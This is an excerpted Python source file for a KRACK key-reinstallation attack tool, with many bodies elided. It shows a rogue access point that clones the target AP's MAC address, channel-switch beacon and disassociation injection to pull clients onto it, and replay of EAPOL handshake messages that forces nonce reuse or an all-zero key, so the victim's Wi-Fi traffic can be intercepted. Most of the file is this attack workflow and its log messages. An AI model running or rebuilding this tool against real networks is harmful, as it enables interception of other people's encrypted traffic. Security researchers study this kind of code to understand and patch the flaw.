...
class KRAckAttack():
	...
	def hostapd_rx_mgmt(self, p):
		outputlog.log(outputlog.DEBUG, "Sent frame to hostapd: %s" % packetProcess.dot11_to_str(p))
		self.hostapd_ctrl.request("RX_MGMT " + str(p[Dot11]).encode("hex"))

	def hostapd_add_sta(self, macaddr):
		outputlog.log(outputlog.DEBUG, "Forwarding auth to rouge AP to register client", showtime=False)
	...
	def hostapd_finish_4way(self, stamac):
		outputlog.log(outputlog.DEBUG, "Sent frame to hostapd: finishing 4-way handshake of %s" % stamac)
		self.hostapd_ctrl.request("FINISH_4WAY %s" % stamac)

	def find_beacon(self, ssid):
		ps = sniff(count=100, timeout=30, lfilter=lambda p: p.haslayer(Dot11Beacon) and packetProcess.get_tlv_value(p, outputlog.IEEE_TLV_TYPE_SSID) == ssid, iface=self.nic_real) # opened_socket=self.sock_real iface=self.nic_real
		if ps is None or len(ps) < 1:
			outputlog.log(outputlog.STATUS, "Searching for target network on other channels")
			for chan in [1, 6, 11, 3, 8, 2, 7, 4, 10, 5, 9, 12, 13]:
				self.sock_real.set_channel(chan)
				outputlog.log(outputlog.DEBUG, "Listening on channel %d" % chan)
				ps = sniff(count=10, timeout=10, lfilter=lambda p: p.haslayer(Dot11Beacon) and packetProcess.get_tlv_value(p, outputlog.IEEE_TLV_TYPE_SSID) == ssid, iface=self.nic_real) # , opened_socket=self.sock_real
				if ps and len(ps) >= 1: break

		if ps and len(ps) >= 1:
			actual_chan = ord(packetProcess.get_tlv_value(ps[0], outputlog.IEEE_TLV_TYPE_CHANNEL))
	...
	def send_csa_beacon(self, numbeacons=1, target=None, silent=False):
		...
		if not silent: outputlog.log(outputlog.STATUS, "Injected %d CSA beacon pairs (moving stations to channel %d)" % (numbeacons, newchannel), color="green")
	...
	def send_disas(self, macaddr):
		...
		outputlog.log(outputlog.STATUS, "Rogue channel: injected Disassociation to %s" % macaddr, color="green")
	...
	def hostapd_add_allzero_client(self, client: ClientState):
		if client.assocreq is None:
			outputlog.log(outputlog.ERROR, "Didn't receive AssocReq of client %s, unable to let rogue hostapd handle client." % client.macaddr)
			return False
	...
	def handle_to_client_pairwise(self, client: ClientState, p):
		...
		if eapolnum == 1 and client.state in [ClientState.Connecting, ClientState.GotMitm]:
			outputlog.log(outputlog.DEBUG, "Storing msg1")
			client.store_msg1(p)
			...
			if len(client.msg3s) >= 2:
				outputlog.log(outputlog.STATUS, "Got 2nd unique EAPOL msg3. Will forward both these Msg3's seperated by a forged msg1.", color="green", showtime=False)
				outputlog.log(outputlog.STATUS, "==> Performing key reinstallation attack!", color="green", showtime=False)
				...
				outputlog.log(outputlog.STATUS, "Not forwarding EAPOL msg3 (%d unique now queued)" % len(client.msg3s), color="green", showtime=False)
	...
	def handle_from_client_pairwise(self, client: ClientState, p):
		...
		if iv <= 1: outputlog.log(outputlog.DEBUG, "Ciphertext: " + encrypted.encode("hex"), showtime=False)
		...
		if client.is_iv_reused(iv):
			...
			if keystream == client.get_keystream(iv):
				outputlog.log(outputlog.STATUS, "SUCCESS! Nonce and keystream reuse detected (IV=%d)." % iv, color="green", showtime=False)
			...
			# Otherwise the client likely installed a new key, i.e., probably an all-zero key
				...
				outputlog.log(outputlog.STATUS, "SUCCESS! Nonce reuse detected (IV=%d), with usage of all-zero encryption key." % iv, color="green", showtime=False)
				outputlog.log(outputlog.STATUS, "Now MitM'ing the victim using our malicious AP, and interceptig its traffic.", color="green", showtime=False)
			...
			outputlog.log(outputlog.WARNING, "KRAck Attack against %s seems to have failed" % client.macaddr)
	...
	def handle_to_client_groupkey(self, client: ClientState, p):
		...
		if p.haslayer(Dot11WEP) and p.addr2 == self.apmac and p.addr3 == self.apmac and packetProcess.dot11_get_tid(p) == 7:
			...
			outputlog.log(outputlog.STATUS, "Queued %s group message 1's" % len(self.group1), showtime=False)
			if len(self.group1) == 2:
				outputlog.log(outputlog.STATUS, "Forwarding first group1 message", showtime=False)
	...
	def handle_from_client_groupkey(self, client, p):
		...
		if p.haslayer(Dot11WEP) and p.addr1 == self.apmac and p.addr3 == self.apmac and packetProcess.dot11_get_tid(p) == 7:
			outputlog.log(outputlog.STATUS, "Got a likely group message 2", showtime=False)
	...
	def handle_rx_realchan(self):
		...
		if p.addr1 == self.apmac:
			...
			if p.haslayer(Dot11Auth):
				packetProcess.print_rx(outputlog.INFO, "Real channel ", p, color="orange")

				# ... with an extra clear warning when we wanted to MitM this specific client
				if self.clientmac == p.addr2:
					outputlog.log(outputlog.WARNING, "Client %s is connecting on real channel, injecting CSA beacon to try to correct." % self.clientmac)
			...
			# Clients sending a deauthentication or disassociation to the real AP are also interesting ...
				...
				packetProcess.print_rx(outputlog.INFO, "Real channel ", p)
				if p.addr2 in self.clients: del self.clients[p.addr2]
			...
			if p.FCfield & 0x10 != 0 and p.addr2 in self.clients and self.clients[p.addr2].state <= ClientState.Attack_Started:
				outputlog.log(outputlog.WARNING, "Injecting Null frame so AP thinks client %s is awake (attacking sleeping clients is not fully supported)" % p.addr2)
		...
		# 2. Handle frames sent BY the real AP
			...
			if p.haslayer(Dot11Beacon) and ord(packetProcess.get_tlv_value(p, outputlog.IEEE_TLV_TYPE_CHANNEL)) == self.netconfig.real_channel:
			...
			if p.haslayer(Dot11Deauth) or p.haslayer(Dot11Disas):
				packetProcess.print_rx(outputlog.INFO, "Real channel ", p, suffix=" -- MitM'ing" if might_forward else None)
			...
			# For other clients, just display what might be forwarded
				...
				packetProcess.print_rx(outputlog.INFO, "Real channel ", p, suffix=" -- MitM'ing")
	...
	def handle_rx_roguechan(self):
		...
		if p.addr2 == self.apmac:
			...
			if p.haslayer(Dot11Beacon) and ord(packetProcess.get_tlv_value(p, outputlog.IEEE_TLV_TYPE_CHANNEL)) == self.netconfig.rogue_channel:
			...
			if self.clientmac is not None and p.addr1 == self.clientmac:
				packetProcess.print_rx(outputlog.INFO, "Rogue channel", p)
		...
		# 2. Handle frames sent TO the AP
			...
			if p.haslayer(Dot11Auth):
				packetProcess.print_rx(outputlog.INFO, "Rogue channel", p, suffix=" -- MitM'ing")
				self.clients[p.addr2] = ClientState(p.addr2)
			...
			# Otherwise check of it's an existing client we are tracking/MitM'ing
				...
				packetProcess.print_rx(outputlog.INFO, "Rogue channel", p, suffix=" -- MitM'ing" if will_forward else None)
	...
	def handle_hostapd_out(self):
		...
		if line == "":
			outputlog.log(outputlog.ERROR, "Rogue hostapd instances unexpectedly closed")
			quit(1)

		if line.startswith(">>>> ".encode()):
			outputlog.log(outputlog.STATUS, "Rogue hostapd: " + line[5:].strip().decode())
		elif line.startswith(">>> ".encode()):
			outputlog.log(outputlog.DEBUG, "Rogue hostapd: " + line[4:].strip().decode())
		# This is a bit hacky but very usefull for quick debugging
		elif "fc=0xc0".encode() in line:
			outputlog.log(outputlog.WARNING, "Rogue hostapd: " + line.strip().decode())
			...
			outputlog.log(outputlog.DEBUG, "Rogue hostapd: " + line.strip().decode())
		else:
			outputlog.log(outputlog.ALL, "Rogue hostapd: " + line.strip().decode())

		self.hostapd_log.write(datetime.now().strftime('[%H:%M:%S] ') + line.decode())

	def configure_interfaces(self):
		# 0. Warn about common mistakes
		outputlog.log(outputlog.STATUS, "Note: remember to disable Wi-Fi in your network manager so it doesn't interfere with this script")
		...
		outputlog.log(outputlog.STATUS, "Note: keep >1 meter between both interfaces. Else packet delivery is unreliable & target may disconnect")
		...
		if self.clientmac:
			...
			outputlog.log(outputlog.WARNING, "WARNING: Targeting ALL clients is not fully supported! Please provide a specific target using --target.")
	...
	def run(self, strict_echo_test=False):
		...
		if self.beacon is None:
			outputlog.log(outputlog.ERROR, "No beacon received of network <%s>. Is monitor mode working? Did you enter the correct SSID?" % self.ssid)
			return
		...
		if not self.netconfig.is_wparsn():
			outputlog.log(outputlog.ERROR, "Target network is not an encrypted WPA or WPA2 network, exiting.")
			return
		elif self.netconfig.real_channel > 13:
			outputlog.log(outputlog.WARNING, "Attack not yet tested against 5 GHz networks.")
		self.netconfig.find_rogue_channel()

		outputlog.log(outputlog.STATUS, "Target network %s detected on channel %d" % (self.apmac, self.netconfig.real_channel), color="green")
		outputlog.log(outputlog.STATUS, "Will create rogue AP on channel %d" % self.netconfig.rogue_channel, color="green")
		# 將強盜 AP 的 MAC addr. 設成原始 AP 的 MAC addr.
		outputlog.log(outputlog.STATUS, "Setting MAC address of %s to %s" % (self.nic_rogue_ap, self.apmac))
		...
		outputlog.log(outputlog.STATUS, "Giving the rogue hostapd one second to initialize ...")
		time.sleep(10)
		...
		while True:
			...
			if self.time_forward_group1 and self.time_forward_group1 <= time.time():
				...
				self.sock_rogue.send(p)
				self.time_forward_group1 = None
				outputlog.log(outputlog.STATUS, "Injected older group message 1: %s" % packetProcess.dot11_to_str(p), color="green")
			...
			if self.last_real_beacon + 2 < time.time():
				outputlog.log(outputlog.WARNING, "WARNING: Didn't receive beacon from real AP for two seconds")
				self.last_real_beacon = time.time()
			if self.last_rogue_beacon + 2 < time.time():
				outputlog.log(outputlog.WARNING, "WARNING: Didn't receive beacon from rogue AP for two seconds")
				self.last_rogue_beacon = time.time()


	def stop(self):
		outputlog.log(outputlog.STATUS, "Closing hostapd and cleaning up ...")
		if self.hostapd:
